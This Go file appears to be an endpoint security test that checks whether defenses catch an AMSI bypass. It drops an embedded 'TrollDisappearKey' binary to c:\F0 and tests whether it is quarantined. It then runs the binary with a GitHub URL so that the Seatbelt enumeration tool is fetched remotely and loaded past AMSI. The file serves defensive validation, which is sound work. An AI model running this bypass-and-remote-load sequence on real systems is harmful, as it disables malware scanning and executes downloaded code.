//go:build windows
// +build windows

/*
ID: c1f0fe6f-6907-4f95-820d-47e0a39abe54
NAME: TrollDisappearKey AMSI Bypass Detection
TECHNIQUE: T1562.001
UNIT: response
CREATED: 2025-01-05 12:00:00.000000
*/
package main

import (
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

//go:embed troll_disappear_key.exe
var malicious []byte

func execute() error {
	// Define target drop path
	targetDir := "c:\\F0"
	targetPath := filepath.Join(targetDir, "troll_disappear_key.exe")

	// Attempt to bypass AMSI and load a .NET assembly
	// Using Seatbelt as a test payload (security enumeration tool that would trigger AMSI)
	Endpoint.Say("Testing AMSI bypass with remote .NET assembly loading (Seatbelt)")

	command := []string{
		targetPath,
		"https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe",
		"AMSIProviders",
		"Software\\Microsoft\\AMSI\\Providers",
	}

	output, err := Endpoint.Shell(command)

	// Check for security blocking vs normal execution
	if err != nil {
		errorMsg := err.Error()

		// Check for security software blocking indicators
		securityBlockingKeywords := []string{
			"access denied", "access is denied", "blocked", "quarantine",
			"virus", "malware", "threat", "security", "permission denied",
			"execution prevented", "policy", "restricted", "forbidden",
		}

		isSecurityBlocked := false
		for _, keyword := range securityBlockingKeywords {
			if strings.Contains(strings.ToLower(errorMsg), keyword) {
				isSecurityBlocked = true
				break
			}
		}

		if isSecurityBlocked {
			// Security software blocked execution
			return fmt.Errorf("TrollDisappearKey was blocked by security software: %v", err)
		}

		// Some other error that's not security blocking - may be normal
		Endpoint.Say("TrollDisappearKey execution completed with error (may be normal): %v", err)
	}

	// Check output to confirm assembly execution
	outputStr := string(output)
	if len(outputStr) > 0 {
		Endpoint.Say("Assembly executed successfully - AMSI bypass worked!")
		Endpoint.Say("Assembly output: %s", outputStr)
	} else {
		Endpoint.Say("TrollDisappearKey executed successfully - AMSI bypass appears to have worked")
	}

	// Clean up any potential artifacts
	possibleArtifacts := []string{
		filepath.Join(targetDir, "Seatbelt.exe"),
		filepath.Join(targetDir, "temp_assembly.exe"),
		targetPath, // Clean up the TrollDisappearKey binary itself
	}

	for _, artifact := range possibleArtifacts {
		if _, err := os.Stat(artifact); err == nil {
			os.Remove(artifact)
			Endpoint.Say("Cleaned up artifact: %s", artifact)
		}
	}

	return nil
}

func test() {
	// Initialize the dropper
	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		Endpoint.Say("%v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	// Create target directory for dropping the binary
	targetDir := "c:\\F0"

	if err := os.MkdirAll(targetDir, 0755); err != nil {
		Endpoint.Say("Failed to create target directory %s: %v", targetDir, err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	// Change to target directory for extraction
	originalDir, err := os.Getwd()
	if err != nil {
		Endpoint.Say("Failed to get current directory: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	if err := os.Chdir(targetDir); err != nil {
		Endpoint.Say("Failed to change to target directory: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	defer os.Chdir(originalDir) // Return to original directory when done

	// Extract the TrollDisappearKey binary directly to c:\F0 and check if it gets quarantined
	Endpoint.Say("Extracting TrollDisappearKey AMSI bypass tool to %s for quarantine test", targetDir)
	Endpoint.Say("Pausing for 3 seconds to gauge defensive reaction")
	Endpoint.Wait(3)

	if Endpoint.Quarantined("troll_disappear_key.exe", malicious) {
		Endpoint.Say("TrollDisappearKey binary was caught and quarantined!")
		Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
	}

	Endpoint.Say("TrollDisappearKey binary was not caught, attempting AMSI bypass execution")

	// Try to execute TrollDisappearKey and perform AMSI bypass
	err = execute()
	if err != nil {
		Endpoint.Say("Got error \"%v\" when executing TrollDisappearKey", err)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}

	Endpoint.Say("TrollDisappearKey execution was not prevented - AMSI bypass succeeded")
	Endpoint.Stop(Endpoint.Unprotected)
}

func main() {
	Endpoint.Start(test)
}
